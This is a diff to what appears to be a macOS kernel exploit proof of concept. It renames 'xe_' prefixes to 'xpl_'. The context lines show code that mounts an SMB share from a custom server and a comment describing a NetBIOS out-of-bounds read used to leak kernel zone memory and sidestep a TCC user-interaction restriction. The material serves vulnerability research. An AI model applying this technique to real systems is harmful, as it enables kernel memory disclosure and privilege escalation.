@@ -19,7 +19,7 @@
 #include <smbfs/smbclient_internal.h>
 #include <smbfs/netbios.h>
 
-#include <xe_smbx/smbx_conf.h>
+#include <xpl_smbx/smbx_conf.h>
 
 ///
 /// Before mouting an SMB share using the `mount` syscall, the user process must first open a
@@ -213,7 +213,7 @@
 /// user land requires opening a file inside SMB share to execute the `fcntl` request. This
 /// will require user interaction because files in network shares are protected by TCC.
 ///
-/// This resctriction is bypassed in `xe_kmem/memory/zkext_neighbor_reader.c` by using
+/// This resctriction is bypassed in `xpl_kmem/memory/zkext_neighbor_reader.c` by using
 /// NetBIOS name OOB read vulnerability in default.64 zone to read zone elements from zones
 /// with element size less than 128 bytes without any user interaction.
 ///
@@ -315,7 +315,7 @@ void oob_read_kext_32(const struct sockaddr_in* smb_addr) {
     
     if (negotiate_req.ioc_errno) {
         printf("[ERROR] SMBIOC_NEGOTIATE returned non zero ioc_errno %d\n", negotiate_req.ioc_errno);
-        printf("[ERROR] Make sure that xe_smbx server is running\n");
+        printf("[ERROR] Make sure that xpl_smbx server is running\n");
         exit(1);
     }
     
@@ -339,8 +339,8 @@ void oob_read_kext_32(const struct sockaddr_in* smb_addr) {
     mount_args.gid = getgid();
     mount_args.file_mode = S_IRWXU;
     mount_args.dir_mode = S_IRWXU;
-    /// xe_smbx server only have very limited capabilities. This flag is required for
-    /// successfully mouting the SMB share using xe_smbx server.
+    /// xpl_smbx server only have very limited capabilities. This flag is required for
+    /// successfully mouting the SMB share using xpl_smbx server.
     mount_args.altflags |= SMBFS_MNT_VALIDATE_NEG_OFF;
     
     char mount_path[] = "/tmp/poc_sockaddr_oob_read_XXXXXXXXXX";
@@ -383,13 +383,13 @@ void oob_read_kext_32(const struct sockaddr_in* smb_addr) {
 int main(int argc, const char * argv[]) {
     smb_client_load_kext();
     
-    /// Socket address of xe_smbx server
+    /// Socket address of xpl_smbx server
     struct sockaddr_in smb_addr;
     bzero(&smb_addr, sizeof(smb_addr));
     smb_addr.sin_family = AF_INET;
     smb_addr.sin_len = sizeof(smb_addr);
-    smb_addr.sin_port = htons(XE_SMBX_PORT);
-    inet_aton(XE_SMBX_HOST, &smb_addr.sin_addr);
+    smb_addr.sin_port = htons(xpl_SMBX_PORT);
+    inet_aton(xpl_SMBX_HOST, &smb_addr.sin_addr);
     
     int num_oob_read_attempts = 10;
     for (int i=0; i<num_oob_read_attempts; i++) {
